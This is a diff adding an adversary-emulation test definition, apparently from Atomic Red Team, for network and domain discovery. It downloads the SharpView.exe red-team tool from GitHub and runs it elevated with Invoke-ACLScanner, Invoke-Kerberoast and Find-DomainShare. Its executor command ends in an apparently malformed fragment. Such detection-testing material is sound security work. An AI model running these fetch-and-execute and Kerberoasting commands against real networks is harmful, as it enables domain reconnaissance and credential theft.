@@ -1,0 +1,47 @@
+{
+    "name": "System Discovery using SharpView",
+    "description": "Get a listing of network connections, domains, domain users, and etc.   sharpview.exe located in the bin folder, an opensource red-team tool. Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n",
+        "type": "Command Executor"
+    },
+    "id": "T1049",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "System Network Connections Discovery",
+    "source": "ART",
+    "uuid": "96f974bb-a0da-4d87-a744-ff33e73367e9",
+    "arguments": {
+        "SharpView_url": {
+            "description": "sharpview download URL",
+            "type": "url",
+            "default": "https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true"
+        },
+        "SharpView": {
+            "description": "Path of the executable opensource redteam tool used for the performing this atomic.",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe"
+        },
+        "syntax": {
+            "description": "Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.",
+            "type": "string",
+            "default": "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Sharpview.exe must exist on disk at specified location (#{SharpView})\n",
+            "prereq_command": "if (Test-Path \"#{SharpView}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{SharpView}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
